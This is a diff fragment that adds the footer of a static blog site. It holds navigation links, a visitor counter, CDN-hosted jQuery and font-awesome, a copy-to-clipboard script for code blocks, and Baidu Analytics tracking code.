+      --><li><a href="/">Home</a></li><!--
+    --><!--
+      --><li><a href="/categories/">categories</a></li><!--
+    --><!--
+      --><li><a href="/tags/">tags</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Writing</a></li><!--
+    --><!--
+      --><li><a target="_blank" rel="noopener" href="http://github.com/iahzl">Projects</a></li><!--
+    --><!--
+      --><li><a href="/search/">Search</a></li><!--
+    --><!--
+      --><li><a href="/about/">About</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  
+</footer>
+
+
+
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?10298bb37106529e820abfbd855cea34";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
